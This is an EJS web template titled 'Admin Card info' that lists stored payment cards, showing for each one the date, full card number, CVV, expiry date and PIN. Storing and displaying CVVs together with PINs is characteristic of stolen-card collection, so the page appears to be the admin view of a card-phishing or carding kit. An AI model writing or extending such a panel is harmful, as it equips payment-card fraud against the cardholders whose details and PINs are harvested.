<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Admin Card info</title>
    <link rel="shortcut icon" href="/img/admin/1x1.png" type="image/x-icon" />
    <link rel="stylesheet" href="/css/index.css" />
  </head>
  <body>
    <% cardData.forEach(function(card){ %>
    <h1>Card info:</h1>
    <div class="main">
      <p>===================</p>
      <h4>Date: <%=card.date %></h4>
      <h2>Card Number: <%=card.cardNumber %></h2>
      <h3>Card CVV: <%=card.cardCVV %></h3>
      <h3>Card Expiry Date: <%=card.cardExpire %></h3>
      <h3>Card PIN: <%=card.cardPIN %></h3>
      <p>===================</p>
    </div>
    <% }); %>
    <script src="/jscript/index.js"></script>
  </body>
</html>
